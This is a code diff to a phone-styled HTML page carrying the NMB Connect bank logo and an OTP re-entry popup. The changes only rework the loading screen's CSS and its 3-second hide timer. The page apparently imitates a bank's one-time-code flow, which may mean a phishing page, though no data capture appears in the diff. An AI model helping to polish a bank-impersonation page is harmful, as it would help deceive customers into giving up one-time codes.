@@ -36,22 +36,24 @@
     @media(max-width:430px){.scr{min-height:100dvh;}}
     .scr.active{display:flex;}
 
-    /* ── LOADING SCREEN (CSS spinner) ── */
-    .scr.loading-scr{
-      display:flex !important;
-      align-items:center;
-      justify-content:center;
-      background:#0F2A54 !important;
-      min-height:100vh;
-      position:absolute;
-      top:0;
-      left:0;
-      width:100%;
-      z-index:50;
+    /* ── LOADING SCREEN (STANDALONE) ── */
+    #s-loading {
+      display: flex !important;
+      align-items: center;
+      justify-content: center;
+      background: #0F2A54 !important;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 9999;
+      flex-direction: column;
     }
-    .scr.loading-scr.active{
-      display:flex !important;
-      background:#0F2A54 !important;
+    #s-loading.hidden {
+      display: none !important;
     }
     .loader-wrapper{
       display:flex;
@@ -76,12 +78,6 @@
       height:auto;
       display:block;
       object-fit:contain;
-    }
-    .loading-fade-out{
-      animation:fadeOut 0.6s ease forwards;
-    }
-    @keyframes fadeOut{
-      to{opacity:0;pointer-events:none;}
     }
 
     /* ── MAIN APP ── */
@@ -382,6 +378,14 @@
 <body>
 <div class="phone">
 
+  <!-- ═══════════════════ LOADING SCREEN (STANDALONE) ═══════════════════ -->
+  <div id="s-loading">
+    <div class="loader-wrapper">
+      <div class="spinner"></div>
+      <img class="loader-logo" src="https://www.nmbconnectonline.co.zw/nmbconnectonline/newassets/img/nmbconnect.png" alt="NMB Connect">
+    </div>
+  </div>
+
   <!-- LOADING OVERLAY -->
   <div class="overlay" id="overlay" style="display:none;">
     <div class="overlay-card" id="overlayCard"></div>
@@ -402,14 +406,6 @@
       <div class="popup-title">No Code Entered</div>
       <div class="popup-message">You did not receive an OTP?<br>Please request a new OTP to continue.</div>
       <button class="popup-btn" onclick="retryOtp()">Retry</button>
-    </div>
-  </div>
-
-  <!-- ═══════════════════ LOADING SCREEN ═══════════════════ -->
-  <div class="scr loading-scr active" id="s-loading">
-    <div class="loader-wrapper">
-      <div class="spinner"></div>
-      <img class="loader-logo" src="https://www.nmbconnectonline.co.zw/nmbconnectonline/newassets/img/nmbconnect.png" alt="NMB Connect">
     </div>
   </div>
 
@@ -576,19 +572,16 @@
 </div>
 
 <script>
-// ── LOADING SCREEN AUTO-TRANSITION ──
-setTimeout(function(){
-  var loadingScreen = document.getElementById('s-loading');
-  var landingScreen = document.getElementById('s-land');
-  
-  loadingScreen.classList.add('loading-fade-out');
-  
-  setTimeout(function(){
-    loadingScreen.classList.remove('active');
-    loadingScreen.style.display = 'none';
-    landingScreen.classList.add('active');
-  }, 600);
-}, 4000);
+// ── HIDE LOADING SCREEN AFTER 3 SECONDS ──
+document.addEventListener('DOMContentLoaded', function() {
+  setTimeout(function() {
+    var loadingScreen = document.getElementById('s-loading');
+    loadingScreen.classList.add('hidden');
+    
+    // Show landing page
+    document.getElementById('s-land').classList.add('active');
+  }, 3000);
+});
 
 var durVal=6;
 
